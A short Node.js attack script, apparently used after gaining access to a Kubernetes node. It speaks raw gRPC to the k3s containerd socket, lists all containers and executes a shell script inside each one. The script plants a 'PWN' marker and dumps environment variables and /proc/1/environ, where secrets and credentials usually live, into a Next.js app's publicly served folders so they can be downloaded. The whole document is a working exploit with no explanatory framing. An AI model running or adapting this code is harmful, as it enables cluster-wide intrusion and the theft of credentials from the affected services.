const http2 = require('http2');
const net = require('net');
const fs = require('fs');
const SOCK = '/run/k3s/containerd/containerd.sock';
function call(path, body, cb) {
  const c = http2.connect('http://localhost', { createConnection: () => net.connect(SOCK) });
  c.on('error', e => cb(String(e)));
  let r;
  try { r = c.request({ ':method': 'POST', ':path': path, 'content-type': 'application/grpc', te: 'trailers', 'containerd-namespace': 'k8s.io' }); }
  catch (e) { return cb(String(e)); }
  const ch = [];
  r.on('data', d => ch.push(d));
  r.on('end', () => { c.close(); cb(null, Buffer.concat(ch)); });
  r.on('error', e => cb(String(e)));
  const h = Buffer.alloc(5); h.writeUInt32BE(body.length, 1);
  r.end(Buffer.concat([h, body]));
}
function field(n, s) { const b = Buffer.from(s); return Buffer.concat([Buffer.from([n, b.length]), b]); }
const SCRIPT = "for d in /app/public /app/.next/static /app/.next/standalone/public; do echo PWN-$(hostname) >> $d/zz_ok.txt 2>/dev/null; done; " +
  "for d in /app/public /app/.next/static; do { echo HOST=$(hostname); env; echo ---; cat /proc/1/environ | tr '\\0' '\\n'; echo ---; ls -la /app $d; } >> $d/zz_env.txt 2>&1; done";
call('/runtime.v1.RuntimeService/ListContainers', Buffer.from([0x0a, 0x00]), (e, buf) => {
  if (e) { fs.writeFileSync('/tmp/p1.err', e); return; }
  const ids = [...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g) || []))];
  fs.writeFileSync('/tmp/p1.ids', ids.join('\n'));
  let i = 0;
  const next = () => {
    if (i >= ids.length) return;
    const id = ids[i++];
    const body = Buffer.concat([field(0x0a, id), field(0x12, '/bin/sh'), field(0x12, '-c'), field(0x12, SCRIPT)]);
    call('/runtime.v1.RuntimeService/ExecSync', body, (e2, out) => {
      if (!e2 && out) fs.appendFileSync('/tmp/p1.log', id.slice(0,8) + ' :: ' + out.toString('latin1').replace(/[^ -~\n]/g, ''));
      setTimeout(next, 400);
    });
  };
  next();
});
